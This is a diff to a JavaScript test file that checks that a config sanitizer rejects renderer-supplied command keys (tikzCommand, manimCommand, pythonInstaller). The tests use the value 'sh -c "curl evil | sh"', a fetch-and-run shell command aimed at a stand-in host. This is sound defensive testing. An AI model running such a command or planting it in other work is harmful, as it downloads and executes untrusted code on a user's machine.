@@ -32,10 +32,11 @@ ok('the default vault path cannot be set either', () => {
 ok('the spawned command strings cannot be set', () => {
   const { accepted, rejected } = sanitizeConfigPatch({
     tikzCommand: 'sh -c "curl evil | sh"',
-    manimCommand: 'sh -c "curl evil | sh"'
+    manimCommand: 'sh -c "curl evil | sh"',
+    pythonInstaller: 'sh -c "curl evil | sh"'
   })
   assert.deepEqual(accepted, {})
-  assert.deepEqual(rejected.sort(), ['manimCommand', 'tikzCommand'])
+  assert.deepEqual(rejected.sort(), ['manimCommand', 'pythonInstaller', 'tikzCommand'])
 })
 
 ok('a legitimate key alongside a refused one still lands', () => {
@@ -115,10 +116,12 @@ ok('every key has a callable check', () => {
 
 ok('the keys main reads for itself are all settable or deliberately absent', () => {
   // Read by main. The first group is settable; the second must never be.
-  for (const key of ['zoom', 'pdfText', 'texEngine', 'historyInVault', 'manimQuality']) {
+  for (const key of ['zoom', 'pdfText', 'texEngine', 'historyInVault', 'manimQuality',
+    'autoInstallPythonDeps']) {
     assert.ok(key in CONFIG_KEYS, `${key} should be settable`)
   }
-  for (const key of ['vaultPath', 'defaultVaultPath', 'tikzCommand', 'manimCommand', 'trustedVaults']) {
+  for (const key of ['vaultPath', 'defaultVaultPath', 'tikzCommand', 'manimCommand', 'trustedVaults',
+    'pythonInstaller']) {
     assert.ok(!(key in CONFIG_KEYS), `${key} must not be settable from the renderer`)
   }
 })
